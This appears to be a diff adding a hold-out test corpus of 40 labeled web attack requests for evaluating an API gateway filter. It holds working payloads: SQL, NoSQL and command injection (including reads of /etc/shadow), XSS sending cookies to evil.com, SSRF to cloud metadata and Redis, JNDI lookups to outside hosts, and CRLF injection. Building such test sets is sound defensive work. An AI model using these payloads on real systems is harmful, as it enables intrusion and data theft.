@@ -1,0 +1,388 @@
+# API Gatekeeper — Hold-Out Attack Corpus (40 cases)
+# Blind evaluation set written independently without rules.yaml inspection.
+
+# ── SQL Injection (8 cases) ────────────────────────────────────────────────
+- id: sqli-holdout-001
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "category=electronics' UNION SELECT 1,username,password,4 FROM admin_users--"
+  body: null
+  headers: {}
+
+- id: sqli-holdout-002
+  category: sqli
+  label: attack
+  method: POST
+  path: /api/auth/login
+  query: ""
+  body: '{"username": "admin'' OR 1=1--", "password": "any"}'
+  headers:
+    content-type: application/json
+
+- id: sqli-holdout-003
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "id=100; TRUNCATE TABLE audit_logs;--"
+  body: null
+  headers: {}
+
+- id: sqli-holdout-004
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=sample' OR '1'='1'/*"
+  body: null
+  headers: {}
+
+- id: sqli-holdout-005
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "sort=price%20DESC%20UNION%20SELECT%20null%2Cschema_name%20FROM%20schemata"
+  body: null
+  headers: {}
+
+- id: sqli-holdout-006
+  category: sqli
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"comment": "great; DROP DATABASE demoshop;--"}'
+  headers:
+    content-type: application/json
+
+- id: sqli-holdout-007
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=test' UNION SELECT 1,2,3--"
+  body: null
+  headers: {}
+
+- id: sqli-holdout-008
+  category: sqli
+  label: attack
+  method: GET
+  path: /api/products
+  query: "q=1' AND 2=2--"
+  body: null
+  headers: {}
+
+# ── Cross-Site Scripting (8 cases) ─────────────────────────────────────────
+- id: xss-holdout-001
+  category: xss
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=<script>document.location='http://evil.com/'+document.cookie</script>"
+  body: null
+  headers: {}
+
+- id: xss-holdout-002
+  category: xss
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"rating": 5, "comment": "<marquee onstart=alert(1)>nice</marquee>"}'
+  headers:
+    content-type: application/json
+
+- id: xss-holdout-003
+  category: xss
+  label: attack
+  method: GET
+  path: /api/products
+  query: "callback=javascript:window.open('http://evil.com')"
+  body: null
+  headers: {}
+
+- id: xss-holdout-004
+  category: xss
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"comment": "<details open ontoggle=alert(1)>click me</details>"}'
+  headers:
+    content-type: application/json
+
+- id: xss-holdout-005
+  category: xss
+  label: attack
+  method: GET
+  path: /api/search
+  query: "q=%3Cscript%20src%3D%22https%3A%2F%2Fevil.org%2Fpayload.js%22%3E%3C%2Fscript%3E"
+  body: null
+  headers: {}
+
+- id: xss-holdout-006
+  category: xss
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"comment": "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>"}'
+  headers:
+    content-type: application/json
+
+- id: xss-holdout-007
+  category: xss
+  label: attack
+  method: GET
+  path: /api/products
+  query: "name=<video><source onerror=\"javascript:alert(1)\">"
+  body: null
+  headers: {}
+
+- id: xss-holdout-008
+  category: xss
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"comment": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"}'
+  headers:
+    content-type: application/json
+
+# ── Command Injection (6 cases) ─────────────────────────────────────────────
+- id: cmdi-holdout-001
+  category: cmdi
+  label: attack
+  method: GET
+  path: /api/products
+  query: "filter=default; id"
+  body: null
+  headers: {}
+
+- id: cmdi-holdout-002
+  category: cmdi
+  label: attack
+  method: POST
+  path: /api/tools
+  query: ""
+  body: '{"action": "test && cat /etc/shadow"}'
+  headers:
+    content-type: application/json
+
+- id: cmdi-holdout-003
+  category: cmdi
+  label: attack
+  method: GET
+  path: /api/health
+  query: "tag=$(cat /etc/passwd)"
+  body: null
+  headers: {}
+
+- id: cmdi-holdout-004
+  category: cmdi
+  label: attack
+  method: GET
+  path: /api/products
+  query: "sort=name; ls -la /var/www"
+  body: null
+  headers: {}
+
+- id: cmdi-holdout-005
+  category: cmdi
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"comment": "check `whoami` status"}'
+  headers:
+    content-type: application/json
+
+- id: cmdi-holdout-006
+  category: cmdi
+  label: attack
+  method: GET
+  path: /api/network
+  query: "host=google.com || ping -c 1 127.0.0.1"
+  body: null
+  headers: {}
+
+# ── NoSQL Injection (4 cases) ───────────────────────────────────────────────
+- id: nosql-holdout-001
+  category: nosql
+  label: attack
+  method: POST
+  path: /api/auth/login
+  query: ""
+  body: '{"username": "admin", "password": {"$gt": ""}}'
+  headers:
+    content-type: application/json
+
+- id: nosql-holdout-002
+  category: nosql
+  label: attack
+  method: GET
+  path: /api/products
+  query: "role[$nin][]=guest&role[$nin][]=user"
+  body: null
+  headers: {}
+
+- id: nosql-holdout-003
+  category: nosql
+  label: attack
+  method: POST
+  path: /api/products
+  query: ""
+  body: '{"query": {"$regex": ".*", "$options": "i"}}'
+  headers:
+    content-type: application/json
+
+- id: nosql-holdout-004
+  category: nosql
+  label: attack
+  method: POST
+  path: /api/auth/login
+  query: ""
+  body: '{"username": {"$in": ["admin", "root", "superuser"]}}'
+  headers:
+    content-type: application/json
+
+# ── Path Traversal (4 cases) ────────────────────────────────────────────────
+- id: trav-holdout-001
+  category: traversal
+  label: attack
+  method: GET
+  path: /api/products
+  query: "filepath=../../../../var/log/auth.log"
+  body: null
+  headers: {}
+
+- id: trav-holdout-002
+  category: traversal
+  label: attack
+  method: GET
+  path: /api/files/../../../../etc/environment
+  query: ""
+  body: null
+  headers: {}
+
+- id: trav-holdout-003
+  category: traversal
+  label: attack
+  method: GET
+  path: /api/images
+  query: "name=..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
+  body: null
+  headers: {}
+
+- id: trav-holdout-004
+  category: traversal
+  label: attack
+  method: GET
+  path: /api/products
+  query: "load=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue"
+  body: null
+  headers: {}
+
+# ── Server-Side Request Forgery (4 cases) ───────────────────────────────────
+- id: ssrf-holdout-001
+  category: ssrf
+  label: attack
+  method: POST
+  path: /api/proxy
+  query: ""
+  body: '{"endpoint": "http://127.0.0.1:22/ssh"}'
+  headers:
+    content-type: application/json
+
+- id: ssrf-holdout-002
+  category: ssrf
+  label: attack
+  method: GET
+  path: /api/avatar
+  query: "src=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/"
+  body: null
+  headers: {}
+
+- id: ssrf-holdout-003
+  category: ssrf
+  label: attack
+  method: GET
+  path: /api/preview
+  query: "url=http://172.16.0.1/admin-console"
+  body: null
+  headers: {}
+
+- id: ssrf-holdout-004
+  category: ssrf
+  label: attack
+  method: POST
+  path: /api/webhook
+  query: ""
+  body: '{"url": "gopher://127.0.0.1:6379/_FLUSHALL"}'
+  headers:
+    content-type: application/json
+
+# ── Log4Shell / JNDI (2 cases) ──────────────────────────────────────────────
+- id: jndi-holdout-001
+  category: jndi
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=${jndi:nis://192.168.1.100/system}"
+  body: null
+  headers: {}
+
+- id: jndi-holdout-002
+  category: jndi
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"note": "${jndi:ldaps://corporate-leak.xyz/poc}"}'
+  headers:
+    content-type: application/json
+
+# ── Scanner / Bot User-Agents (2 cases) ─────────────────────────────────────
+- id: bot-holdout-001
+  category: bot
+  label: attack
+  method: GET
+  path: /api/products
+  query: "search=' UNION SELECT 1,2,3--"
+  body: null
+  headers:
+    user-agent: "Acunetix-Auto-Scanner"
+
+- id: bot-holdout-002
+  category: bot
+  label: attack
+  method: GET
+  path: /api/products
+  query: "id=1' OR 1=1--"
+  body: null
+  headers:
+    user-agent: "Masscan/1.3.2"
+
+# ── Protocol Manipulation / CRLF (2 cases) ──────────────────────────────────
+- id: proto-holdout-001
+  category: protocol
+  label: attack
+  method: GET
+  path: /api/products
+  query: "cat=electronics%0d%0aContent-Type:text/html"
+  body: null
+  headers: {}
+
+- id: proto-holdout-002
+  category: protocol
+  label: attack
+  method: POST
+  path: /api/feedback
+  query: ""
+  body: '{"note": "test\r\nSet-Cookie: session=hijacked"}'
+  headers:
+    content-type: application/json
